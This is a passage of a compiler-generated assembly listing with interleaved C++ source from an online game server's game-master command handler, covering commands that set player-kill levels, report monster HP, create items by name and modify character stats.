  002fb	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  002fe	c6 80 fc 00 00
	00 00		 mov	 BYTE PTR [eax+252], 0

; 961  : 			lpObj->m_PK_Level	= 3;

  00305	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00308	c6 80 fd 00 00
	00 03		 mov	 BYTE PTR [eax+253], 3

; 962  : 			lpObj->m_PK_Time	= 0;

  0030f	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00312	c7 80 00 01 00
	00 00 00 00 00	 mov	 DWORD PTR [eax+256], 0

; 963  : 
; 964  : #ifdef UPDATE_PK_SYSTEM_20070302	//     
; 965  : 			if(lpObj->PartyNumber >= 0)	//    
; 966  : 			{
; 967  : 				gParty.UpdatePKUserInfo(lpObj->PartyNumber, lpObj->m_Index, lpObj->DBNumber, lpObj->m_PK_Level);
; 968  : 				gParty.UpdatePKPartyPanalty(lpObj->PartyNumber);
; 969  : 			}
; 970  : 		}
; 971  : 	break;
; 972  : 
; 973  : 	case GMCMD_NOTIFYMONSTERHP:
; 974  : 		{
; 975  : 			INT	iMonsterClass = GetTokenNumber();
; 976  : 			
; 977  : 			//    
; 978  : 			if( iMonsterClass == 0 )
; 979  : 			{
; 980  : 				TNotice _Notice(TNOTICE_TYPE_LEFTTOP);
; 981  : 				_Notice.SendToUser( lpObj->m_Index, "%d   .");
; 982  : 			}
; 983  : 			else
; 984  : 			{
; 985  : 				for( int count=0; count < MAXVIEWPORTOBJECT; count++ )
; 986  : 				{
; 987  : 					if( lpObj->VpPlayer[count].state )
; 988  : 					{
; 989  : 						if( lpObj->VpPlayer[count].type == OBJTYPE_MONSTER )
; 990  : 						{
; 991  : 							if( lpObj->VpPlayer[count].number >= 0 )
; 992  : 							{
; 993  : 								LPOBJECTSTRUCT lpTargetObj = &gObj[lpObj->VpPlayer[count].number];
; 994  : 
; 995  : 								if( lpTargetObj->Class == iMonsterClass )
; 996  : 								{
; 997  : 									TNotice _Notice(TNOTICE_TYPE_LEFTTOP);
; 998  : 									_Notice.SendToUser( lpObj->m_Index, 
; 999  : 										"%d   HP = %7.0f / %7.0f", iMonsterClass, lpTargetObj->Life,lpTargetObj->MaxLife );
; 1000 : 								}
; 1001 : 							}
; 1002 : 						}
; 1003 : 						
; 1004 : 					}
; 1005 : 				}
; 1006 : 				
; 1007 : 			}
; 1008 : 
; 1009 : 		}
; 1010 : 
; 1011 : 	break;
; 1012 : 
; 1013 : #ifdef MODIFY_NOTICE_20040325	
; 1014 : 	case GMCMD_NOTICEALL:
; 1015 : 		{	
; 1016 : 			//TNotice _Notice();
; 1017 : 			//TNotice _Notice(TNOTICE_TYPE_LEFTTOP);
; 1018 : 			//TNotice _Notice(TNOTICE_TYPE_GUILD);
; 1019 : 			TNotice _Notice;
; 1020 : 			_Notice.SendToAllUser("%s", GetTokenString() );			
; 1021 : 		}
; 1022 : 	break;
; 1023 : #endif
; 1024 : 	
; 1025 : 
; 1026 : 	case GMCMD_SETPKLEVEL:
; 1027 : 		{
; 1028 : 			int nPK_Level = GetTokenNumber();
; 1029 : 
; 1030 : 			if( nPK_Level == 0 )
; 1031 : 				nPK_Level = 3;
; 1032 : 
; 1033 : 			if( nPK_Level == 1 ) 
; 1034 : 			{
; 1035 : 				lpObj->m_PK_Level = 1;
; 1036 : 			}
; 1037 : 			else if( nPK_Level == 2 ) 
; 1038 : 			{
; 1039 : 				lpObj->m_PK_Level = 2;
; 1040 : 			}
; 1041 : 			else if( nPK_Level == 3 ) 
; 1042 : 			{
; 1043 : 				lpObj->m_PK_Time = 0;
; 1044 : 				lpObj->m_PK_Level = 3;
; 1045 : 			}
; 1046 : 			else if( nPK_Level == 4 ) 
; 1047 : 			{
; 1048 : 				lpObj->m_PK_Level = 4;
; 1049 : #ifdef UPDATE_PK_SYSTEM_20070302
; 1050 : 				lpObj->m_PK_Count = 1;
; 1051 : #endif
; 1052 : 			}
; 1053 : 			else if( nPK_Level == 5 ) 
; 1054 : 			{
; 1055 : 				lpObj->m_PK_Level = 5;
; 1056 : #ifdef UPDATE_PK_SYSTEM_20070302
; 1057 : 				lpObj->m_PK_Count = 2;
; 1058 : #endif
; 1059 : 			}
; 1060 : 			else if( nPK_Level == 6 ) 
; 1061 : 			{
; 1062 : 				lpObj->m_PK_Level = 6;
; 1063 : #ifdef UPDATE_PK_SYSTEM_20070302
; 1064 : 				lpObj->m_PK_Count = 3;
; 1065 : #endif
; 1066 : 			}
; 1067 : 			else
; 1068 : 			{
; 1069 : 				lpObj->m_PK_Level = 3;
; 1070 : 			}
; 1071 : 
; 1072 : 			if( lpObj->m_PK_Level == PK_LEVEL_DEFAULT + 1 )
; 1073 : 			{	
; 1074 : 				GCServerMsgStringSend(lMsg.Get(1137), lpObj->m_Index, 1);
; 1075 : 			}
; 1076 : 			
; 1077 : 			if( lpObj->m_PK_Level <= PK_LEVEL_DEFAULT + 3 )
; 1078 : 			{
; 1079 : 				GCPkLevelSend(lpObj->m_Index, lpObj->m_PK_Level);
; 1080 : 			}
; 1081 : 
; 1082 : #ifdef UPDATE_PK_SYSTEM_20070302	//     
; 1083 : 			if(lpObj->PartyNumber >= 0)	//    
; 1084 : 			{
; 1085 : 				gParty.UpdatePKUserInfo(lpObj->PartyNumber, lpObj->m_Index, lpObj->DBNumber, lpObj->m_PK_Level);
; 1086 : 				gParty.UpdatePKPartyPanalty(lpObj->PartyNumber);
; 1087 : 			}
; 1088 : #endif
; 1089 : 		}
; 1090 : 	break;
; 1091 : 
; 1092 : 	case GMCMD_CREATEITEMNAME:
; 1093 : 		//if( (lpObj->AuthorityCode&AUTHORITY_CODE_SETPOSITION) != AUTHORITY_CODE_SETPOSITION) return 0;
; 1094 : 	{
; 1095 : 		int type, index, level, op1=0, op2=0, op3=0;
; 1096 : 		BYTE NewOption=0;
; 1097 : 		int  dur=255;
; 1098 : 
; 1099 : 		//////////////////////////////////////////////////////////////////
; 1100 : 		char _notice[100] = {0,};
; 1101 : 		char _itemname[20] = {0,};
; 1102 : 		
; 1103 : 		try
; 1104 : 		{
; 1105 : 			ZeroMemory( _itemname, sizeof(_itemname) );
; 1106 : 			strcpy( _itemname, GetTokenString() );
; 1107 : 		}
; 1108 : 		catch(...)
; 1109 : 		{
; 1110 : 			wsprintf(_itemname, "");
; 1111 : 		}
; 1112 : 		
; 1113 : 		
; 1114 : 		int _Type, _Index;
; 1115 : 		int i;
; 1116 : 		for( i=0; i<MAX_ITEM; i++ )
; 1117 : 		{
; 1118 : 			if( !strcmp( _itemname, ItemAttribute[i].Name) )
; 1119 : 			{
; 1120 : 				_Type = i / MAX_ITEM_INDEX;
; 1121 : 				_Index = i-_Type*MAX_ITEM_INDEX;
; 1122 : 				sprintf( _notice, "[ %s ]    = %d, %d", ItemAttribute[i].Name, _Type, _Index );
; 1123 : 				break;
; 1124 : 			}
; 1125 : 		}
; 1126 : 		
; 1127 : 		if( i==MAX_ITEM )
; 1128 : 		{
; 1129 : 			sprintf( _notice, "  .." );
; 1130 : 			GCServerMsgStringSend( _notice, lpObj->m_Index, 1);
; 1131 : 			return 0;
; 1132 : 		}
; 1133 : 		
; 1134 : 		GCServerMsgStringSend( _notice, lpObj->m_Index, 1);
; 1135 : 		//////////////////////////////////////////////////////////////////
; 1136 : 		
; 1137 : 		type  = _Type;
; 1138 : 		index = _Index;
; 1139 : 		level = GetTokenNumber();
; 1140 : 		
; 1141 : 		dur   = GetTokenNumber();
; 1142 : 
; 1143 : 		op1 = GetTokenNumber();
; 1144 : 		op2 = GetTokenNumber();
; 1145 : 		int op3temp = GetTokenNumber();
; 1146 : 		
; 1147 : #ifdef FOR_BLOODCASTLE	//   !! ->  
; 1148 : //		if ((type >=0) && (type <=11))
; 1149 : //			return 0;
; 1150 : #endif
; 1151 : 
; 1152 : 		if( type == 13 && index == 3 )
; 1153 : 		{	//  
; 1154 : 			if( op3temp < 8 )
; 1155 : 				op3 = op3temp;
; 1156 : 		}
; 1157 : 		else
; 1158 : 		{
; 1159 : 			if( op3temp == 4 )
; 1160 : 			{
; 1161 : 				op3 = 1;
; 1162 : 			}
; 1163 : 			else if( op3temp == 8 )
; 1164 : 			{
; 1165 : 				op3 = 2;
; 1166 : 			}
; 1167 : 			else if( op3temp == 12 )
; 1168 : 			{
; 1169 : 				op3 = 3;
; 1170 : 			}
; 1171 : 			else if( op3temp == 16 )
; 1172 : 			{
; 1173 : 				op3 = 4;
; 1174 : 			}
; 1175 : 			else if( op3temp == 20 )
; 1176 : 			{
; 1177 : 				op3 = 5;
; 1178 : 			}	
; 1179 : 			else if( op3temp == 24 )
; 1180 : 			{
; 1181 : 				op3 = 6;
; 1182 : 			}	
; 1183 : 			else if( op3temp == 28 )
; 1184 : 			{
; 1185 : 				op3 = 7;
; 1186 : 			}		
; 1187 : 		}
; 1188 : 		
; 1189 : 		int setoption= GetTokenNumber();		
; 1190 : 		int addstat= GetTokenNumber();
; 1191 : 
; 1192 : 		
; 1193 : 		if( setoption )
; 1194 : 		{
; 1195 : 			if( addstat == 0 )
; 1196 : 			{
; 1197 : 				if( rand()%100 < 80 )
; 1198 : 					setoption |= 0x04;
; 1199 : 				else
; 1200 : 					setoption |= 0x08;
; 1201 : 			}
; 1202 : 			else
; 1203 : 			{
; 1204 : 				if( addstat == 1 )
; 1205 : 					setoption |= 0x04;
; 1206 : 				else
; 1207 : 					setoption |= 0x08;
; 1208 : 			}
; 1209 : 		}		
; 1210 : 
; 1211 : 		int nop1= GetTokenNumber();
; 1212 : 		if( nop1 > 0 ) NewOption |= 0x20;
; 1213 : 		int nop2= GetTokenNumber();
; 1214 : 		if( nop2 > 0 ) NewOption |= 0x10;
; 1215 : 		int nop3= GetTokenNumber();
; 1216 : 		if( nop3 > 0 ) NewOption |= 0x08;
; 1217 : 		int nop4= GetTokenNumber();
; 1218 : 		if( nop4 > 0 ) NewOption |= 0x04;
; 1219 : 		int nop5= GetTokenNumber();
; 1220 : 		if( nop5 > 0 ) NewOption |= 0x02;
; 1221 : 		int nop6= GetTokenNumber();
; 1222 : 		if( nop6 > 0 ) NewOption |= 0x01;		
; 1223 : 		
; 1224 : 		if( (type >= 0 && type < MAX_ITEM_INDEX) &&
; 1225 : 			(index>= 0 && index< MAX_ITEM_INDEX) )
; 1226 : 		{
; 1227 : 			int itemtype = ItemGetNumberMake( type, index);
; 1228 : 
; 1229 : 			if( itemtype == MAKE_ITEMNUM(0, 19) || 
; 1230 : 				itemtype == MAKE_ITEMNUM(4, 18) || 
; 1231 : 				itemtype == MAKE_ITEMNUM(5, 10) 
; 1232 : #ifdef ADD_WEAPON_OF_ARCHANGEL_SCEPTER_20050706
; 1233 : 				|| itemtype == MAKE_ITEMNUM(2, 13) 
; 1234 : #endif
; 1235 : 			  )
; 1236 : 			{	//       
; 1237 : 				NewOption = 0x3f;
; 1238 : 			}
; 1239 : 			
; 1240 : #ifdef DARKLORD_WORK
; 1241 : 			if( itemtype == MAKE_ITEMNUM(13, 4) || itemtype == MAKE_ITEMNUM(13, 5) )
; 1242 : 			{
; 1243 : 				PetItemSerialCreateSend(aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, itemtype, level, (BYTE)dur, op1, op2, op3, -1, NewOption, setoption);
; 1244 : 			}
; 1245 : 			else
; 1246 : #endif	// #ifdef DARKLORD_WORK
; 1247 : 
; 1248 : 			ItemSerialCreateSend(aIndex, gObj[aIndex].MapNumber, gObj[aIndex].X, gObj[aIndex].Y, itemtype, level, (BYTE)dur, op1, op2, op3, -1, NewOption, setoption);			
; 1249 : 		}
; 1250 : 	}	
; 1251 : 	break;
; 1252 : #else
; 1253 : 	}
; 1254 : 	break;

  0031c	e9 9b 39 00 00	 jmp	 $LN2@Management
$LN62@Management:

; 1255 : #endif
; 1256 : 
; 1257 : 	//   
; 1258 : 	case GMCMD_INFORMITEMINDEX:
; 1259 : 		{	
; 1260 : 			char _notice[100] = {0,};

  00321	6a 64		 push	 100			; 00000064H
  00323	6a 00		 push	 0
  00325	8d 85 40 fd ff
	ff		 lea	 eax, DWORD PTR __notice$156[ebp]
  0032b	50		 push	 eax
  0032c	e8 00 00 00 00	 call	 _memset
  00331	83 c4 0c	 add	 esp, 12			; 0000000cH

; 1261 : 			char _itemname[20] = {0,};

  00334	33 c0		 xor	 eax, eax
  00336	89 85 2c fd ff
	ff		 mov	 DWORD PTR __itemname$155[ebp], eax
  0033c	89 85 30 fd ff
	ff		 mov	 DWORD PTR __itemname$155[ebp+4], eax
  00342	89 85 34 fd ff
	ff		 mov	 DWORD PTR __itemname$155[ebp+8], eax
  00348	89 85 38 fd ff
	ff		 mov	 DWORD PTR __itemname$155[ebp+12], eax
  0034e	89 85 3c fd ff
	ff		 mov	 DWORD PTR __itemname$155[ebp+16], eax

; 1262 : 			strcpy( _itemname, GetTokenString() );

  00354	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00357	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  0035c	50		 push	 eax
  0035d	8d 85 2c fd ff
	ff		 lea	 eax, DWORD PTR __itemname$155[ebp]
  00363	50		 push	 eax
  00364	e8 00 00 00 00	 call	 _strcpy
  00369	83 c4 08	 add	 esp, 8

; 1263 : 			
; 1264 : 			int i;
; 1265 : 			for( i=0; i<MAX_ITEM; i++ )

  0036c	c7 85 28 fd ff
	ff 00 00 00 00	 mov	 DWORD PTR _i$154[ebp], 0
  00376	eb 0f		 jmp	 SHORT $LN12@Management
$LN10@Management:
  00378	8b 85 28 fd ff
	ff		 mov	 eax, DWORD PTR _i$154[ebp]
  0037e	83 c0 01	 add	 eax, 1
  00381	89 85 28 fd ff
	ff		 mov	 DWORD PTR _i$154[ebp], eax
$LN12@Management:
  00387	81 bd 28 fd ff
	ff 00 02 00 00	 cmp	 DWORD PTR _i$154[ebp], 512 ; 00000200H
  00391	0f 8d 83 00 00
	00		 jge	 $LN11@Management

; 1266 : 			{
; 1267 : 				if( !strcmp( _itemname, ItemAttribute[i].Name) )

  00397	6b 85 28 fd ff
	ff 6c		 imul	 eax, DWORD PTR _i$154[ebp], 108
  0039e	05 00 00 00 00	 add	 eax, OFFSET ?ItemAttribute@@3PAUITEM_ATTRIBUTE@@A ; ItemAttribute
  003a3	50		 push	 eax
  003a4	8d 8d 2c fd ff
	ff		 lea	 ecx, DWORD PTR __itemname$155[ebp]
  003aa	51		 push	 ecx
  003ab	e8 00 00 00 00	 call	 _strcmp
  003b0	83 c4 08	 add	 esp, 8
  003b3	85 c0		 test	 eax, eax
  003b5	75 5e		 jne	 SHORT $LN63@Management

; 1268 : 				{
; 1269 : 					int _Type, _Index;
; 1270 : 
; 1271 : 					_Type = i / MAX_ITEM_INDEX;

  003b7	8b 85 28 fd ff
	ff		 mov	 eax, DWORD PTR _i$154[ebp]
  003bd	99		 cdq
  003be	83 e2 1f	 and	 edx, 31			; 0000001fH
  003c1	03 c2		 add	 eax, edx
  003c3	c1 f8 05	 sar	 eax, 5
  003c6	89 85 24 fd ff
	ff		 mov	 DWORD PTR __Type$153[ebp], eax

; 1272 : 					_Index = i-_Type*MAX_ITEM_INDEX;

  003cc	8b 85 24 fd ff
	ff		 mov	 eax, DWORD PTR __Type$153[ebp]
  003d2	c1 e0 05	 shl	 eax, 5
  003d5	8b 8d 28 fd ff
	ff		 mov	 ecx, DWORD PTR _i$154[ebp]
  003db	2b c8		 sub	 ecx, eax
  003dd	89 8d 20 fd ff
	ff		 mov	 DWORD PTR __Index$152[ebp], ecx

; 1273 : 					sprintf( _notice, "[ %s ]    = %d, %d", ItemAttribute[i].Name, _Type, _Index );

  003e3	8b 85 20 fd ff
	ff		 mov	 eax, DWORD PTR __Index$152[ebp]
  003e9	50		 push	 eax
  003ea	8b 8d 24 fd ff
	ff		 mov	 ecx, DWORD PTR __Type$153[ebp]
  003f0	51		 push	 ecx
  003f1	6b 95 28 fd ff
	ff 6c		 imul	 edx, DWORD PTR _i$154[ebp], 108
  003f8	81 c2 00 00 00
	00		 add	 edx, OFFSET ?ItemAttribute@@3PAUITEM_ATTRIBUTE@@A ; ItemAttribute
  003fe	52		 push	 edx
  003ff	68 00 00 00 00	 push	 OFFSET ??_C@_0CB@CPEOIFGE@?$FL?5?$CFs?5?$FN?5?$MA?G?5?$LO?F?$MA?L?E?$NL?5?$MA?N?$LF?$KG?$LN?$LK?5?$DN?5?$CFd?0?5?$CF@
  00404	8d 85 40 fd ff
	ff		 lea	 eax, DWORD PTR __notice$156[ebp]
  0040a	50		 push	 eax
  0040b	e8 00 00 00 00	 call	 _sprintf
  00410	83 c4 14	 add	 esp, 20			; 00000014H

; 1274 : 					break;

  00413	eb 05		 jmp	 SHORT $LN11@Management
$LN63@Management:

; 1275 : 				}
; 1276 : 			}

  00415	e9 5e ff ff ff	 jmp	 $LN10@Management
$LN11@Management:

; 1277 : 
; 1278 : 			if( i==MAX_ITEM )

  0041a	81 bd 28 fd ff
	ff 00 02 00 00	 cmp	 DWORD PTR _i$154[ebp], 512 ; 00000200H
  00424	75 14		 jne	 SHORT $LN64@Management

; 1279 : 				sprintf( _notice, "  .." );

  00426	68 00 00 00 00	 push	 OFFSET ??_C@_0BD@KEDKPOLC@?$LO?K?$LM?v?5?$LO?x?$LE?B?5?$LO?F?$MA?L?E?$NL?4?4@
  0042b	8d 85 40 fd ff
	ff		 lea	 eax, DWORD PTR __notice$156[ebp]
  00431	50		 push	 eax
  00432	e8 00 00 00 00	 call	 _sprintf
  00437	83 c4 08	 add	 esp, 8
$LN64@Management:

; 1280 : 
; 1281 : 			GCServerMsgStringSend( _notice, lpObj->m_Index, 1);

  0043a	6a 01		 push	 1
  0043c	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0043f	8b 08		 mov	 ecx, DWORD PTR [eax]
  00441	51		 push	 ecx
  00442	8d 95 40 fd ff
	ff		 lea	 edx, DWORD PTR __notice$156[ebp]
  00448	52		 push	 edx
  00449	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  0044e	83 c4 0c	 add	 esp, 12			; 0000000cH

; 1282 : 		}
; 1283 : 	break;

  00451	e9 66 38 00 00	 jmp	 $LN2@Management
$LN65@Management:

; 1284 : 
; 1285 : 	// 
; 1286 : 	case GMCMD_MODIFYSTAT:
; 1287 : 		{	
; 1288 : 			int Class = lpObj->Class;

  00456	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00459	0f b7 88 9c 00
	00 00		 movzx	 ecx, WORD PTR [eax+156]
  00460	89 8d 1c fd ff
	ff		 mov	 DWORD PTR _Class$151[ebp], ecx

; 1289 : 
; 1290 : 			int _strength, _dexterity, _vitality, _energy;
; 1291 : 
; 1292 : 			int _temp_levelup, _temp;
; 1293 : 
; 1294 : 			_strength	= GetTokenNumber();

  00466	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00469	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  0046e	89 85 18 fd ff
	ff		 mov	 DWORD PTR __strength$150[ebp], eax

; 1295 : 			_dexterity	= GetTokenNumber();

  00474	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00477	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  0047c	89 85 14 fd ff
	ff		 mov	 DWORD PTR __dexterity$149[ebp], eax

; 1296 : 			_vitality	= GetTokenNumber();

  00482	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00485	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  0048a	89 85 10 fd ff
	ff		 mov	 DWORD PTR __vitality$148[ebp], eax

; 1297 : 			_energy		= GetTokenNumber();

  00490	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  00493	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  00498	89 85 0c fd ff
	ff		 mov	 DWORD PTR __energy$147[ebp], eax

; 1298 : 
; 1299 : 			_temp = _strength + _dexterity + _vitality + _energy;

  0049e	8b 85 18 fd ff
	ff		 mov	 eax, DWORD PTR __strength$150[ebp]
  004a4	03 85 14 fd ff
	ff		 add	 eax, DWORD PTR __dexterity$149[ebp]
  004aa	03 85 10 fd ff
	ff		 add	 eax, DWORD PTR __vitality$148[ebp]
  004b0	03 85 0c fd ff
	ff		 add	 eax, DWORD PTR __energy$147[ebp]
  004b6	89 85 04 fd ff
	ff		 mov	 DWORD PTR __temp$145[ebp], eax

; 1300 : 
; 1301 : #ifdef DARKLORD_WORK
; 1302 : 			if (lpObj->Class == CLASS_DARKLORD||lpObj->Class == CLASS_MAGUMSA) 

  004bc	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  004bf	0f b7 88 9c 00
	00 00		 movzx	 ecx, WORD PTR [eax+156]
  004c6	83 f9 04	 cmp	 ecx, 4
  004c9	74 0f		 je	 SHORT $LN68@Management
  004cb	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  004ce	0f b7 88 9c 00
	00 00		 movzx	 ecx, WORD PTR [eax+156]
  004d5	83 f9 03	 cmp	 ecx, 3
  004d8	75 64		 jne	 SHORT $LN66@Management
$LN68@Management:

; 1303 : #else			
; 1304 : 			if( lpObj->Class == CLASS_MAGUMSA )
; 1305 : #endif
; 1306 : 				_temp_levelup = (lpObj->Level-1)*7 

  004da	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  004dd	0f bf 88 a0 00
	00 00		 movsx	 ecx, WORD PTR [eax+160]
  004e4	83 e9 01	 sub	 ecx, 1
  004e7	6b d1 07	 imul	 edx, ecx, 7
  004ea	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  004f4	0f b7 88 08 00
	00 00		 movzx	 ecx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+8]
  004fb	03 d1		 add	 edx, ecx
  004fd	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  00507	0f b7 88 0a 00
	00 00		 movzx	 ecx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+10]
  0050e	03 d1		 add	 edx, ecx
  00510	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  0051a	0f b7 88 0c 00
	00 00		 movzx	 ecx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+12]
  00521	03 d1		 add	 edx, ecx
  00523	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  0052d	0f b7 88 0e 00
	00 00		 movzx	 ecx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+14]
  00534	03 d1		 add	 edx, ecx
  00536	89 95 08 fd ff
	ff		 mov	 DWORD PTR __temp_levelup$146[ebp], edx
  0053c	eb 62		 jmp	 SHORT $LN67@Management
$LN66@Management:

; 1307 : 								+ DCInfo.DefClass[Class].Strength + DCInfo.DefClass[Class].Dexterity
; 1308 : 								+ DCInfo.DefClass[Class].Vitality + DCInfo.DefClass[Class].Energy;
; 1309 : 			else
; 1310 : 				_temp_levelup = (lpObj->Level-1)*5

  0053e	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00541	0f bf 88 a0 00
	00 00		 movsx	 ecx, WORD PTR [eax+160]
  00548	83 e9 01	 sub	 ecx, 1
  0054b	6b d1 05	 imul	 edx, ecx, 5
  0054e	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  00558	0f b7 88 08 00
	00 00		 movzx	 ecx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+8]
  0055f	03 d1		 add	 edx, ecx
  00561	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  0056b	0f b7 88 0a 00
	00 00		 movzx	 ecx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+10]
  00572	03 d1		 add	 edx, ecx
  00574	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  0057e	0f b7 88 0c 00
	00 00		 movzx	 ecx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+12]
  00585	03 d1		 add	 edx, ecx
  00587	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  00591	0f b7 88 0e 00
	00 00		 movzx	 ecx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+14]
  00598	03 d1		 add	 edx, ecx
  0059a	89 95 08 fd ff
	ff		 mov	 DWORD PTR __temp_levelup$146[ebp], edx
$LN67@Management:

; 1311 : 								+ DCInfo.DefClass[Class].Strength + DCInfo.DefClass[Class].Dexterity
; 1312 : 								+ DCInfo.DefClass[Class].Vitality + DCInfo.DefClass[Class].Energy;
; 1313 : 
; 1314 : 			if( ( _strength < DCInfo.DefClass[Class].Strength)		|| 
; 1315 : 				( _dexterity < DCInfo.DefClass[Class].Dexterity)	||
; 1316 : 				( _vitality < DCInfo.DefClass[Class].Vitality)		||

  005a0	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  005aa	0f b7 88 08 00
	00 00		 movzx	 ecx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+8]
  005b1	39 8d 18 fd ff
	ff		 cmp	 DWORD PTR __strength$150[ebp], ecx
  005b7	7c 4b		 jl	 SHORT $LN70@Management
  005b9	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  005c3	0f b7 88 0a 00
	00 00		 movzx	 ecx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+10]
  005ca	39 8d 14 fd ff
	ff		 cmp	 DWORD PTR __dexterity$149[ebp], ecx
  005d0	7c 32		 jl	 SHORT $LN70@Management
  005d2	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  005dc	0f b7 88 0c 00
	00 00		 movzx	 ecx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+12]
  005e3	39 8d 10 fd ff
	ff		 cmp	 DWORD PTR __vitality$148[ebp], ecx
  005e9	7c 19		 jl	 SHORT $LN70@Management
  005eb	69 85 1c fd ff
	ff 60 09 00 00	 imul	 eax, DWORD PTR _Class$151[ebp], 2400
  005f5	0f b7 88 0e 00
	00 00		 movzx	 ecx, WORD PTR ?DCInfo@@3Vclassdef@@A[eax+14]
  005fc	39 8d 0c fd ff
	ff		 cmp	 DWORD PTR __energy$147[ebp], ecx
  00602	7d 1c		 jge	 SHORT $LN69@Management
$LN70@Management:

; 1317 : 				( _energy < DCInfo.DefClass[Class].Energy)
; 1318 : 			  )
; 1319 : 			{
; 1320 : 				GCServerMsgStringSend("   .()", lpObj->m_Index, 1);

  00604	6a 01		 push	 1
  00606	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00609	8b 08		 mov	 ecx, DWORD PTR [eax]
  0060b	51		 push	 ecx
  0060c	68 00 00 00 00	 push	 OFFSET ??_C@_0CH@KPNIMDDJ@?$LN?$LK?E?H?5?$LM?$LD?A?$KE?$MA?L?5?$MA?$NP?$LI?x?5?$LF?F?$LN?$MA?$LE?O?$LE?Y?4?$CI?$LB?b?$LK?$LL@
  00611	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00616	83 c4 0c	 add	 esp, 12			; 0000000cH

; 1321 : 				return 0;

  00619	33 c0		 xor	 eax, eax
  0061b	e9 9e 36 00 00	 jmp	 $LN1@Management
$LN69@Management:

; 1322 : 			}
; 1323 : 
; 1324 : 			if( _temp > _temp_levelup )

  00620	8b 85 04 fd ff
	ff		 mov	 eax, DWORD PTR __temp$145[ebp]
  00626	3b 85 08 fd ff
	ff		 cmp	 eax, DWORD PTR __temp_levelup$146[ebp]
  0062c	7e 1c		 jle	 SHORT $LN71@Management

; 1325 : 			{
; 1326 : 				GCServerMsgStringSend("   .()", lpObj->m_Index, 1);

  0062e	6a 01		 push	 1
  00630	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00633	8b 08		 mov	 ecx, DWORD PTR [eax]
  00635	51		 push	 ecx
  00636	68 00 00 00 00	 push	 OFFSET ??_C@_0CD@MKLNLHDL@?$LN?$LK?E?H?5?$LM?$LD?A?$KE?$MA?L?5?$MA?$NP?$LI?x?5?$LF?F?$LN?$MA?$LE?O?$LE?Y?4?$CI?G?U?C?J@
  0063b	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  00640	83 c4 0c	 add	 esp, 12			; 0000000cH

; 1327 : 				return 0;

  00643	33 c0		 xor	 eax, eax
  00645	e9 74 36 00 00	 jmp	 $LN1@Management
$LN71@Management:

; 1328 : 			}
; 1329 : #ifdef NEW_SKILL_FORSKYLAND
; 1330 : 			lpObj->ChangeUP		= 0;

  0064a	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0064d	c6 80 9f 00 00
	00 00		 mov	 BYTE PTR [eax+159], 0

; 1331 : #endif
; 1332 : 
; 1333 : 			lpObj->Experience	= 0;

  00654	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  00657	c7 80 a8 00 00
	00 00 00 00 00	 mov	 DWORD PTR [eax+168], 0

; 1334 : 
; 1335 : 			lpObj->Strength		= _strength;

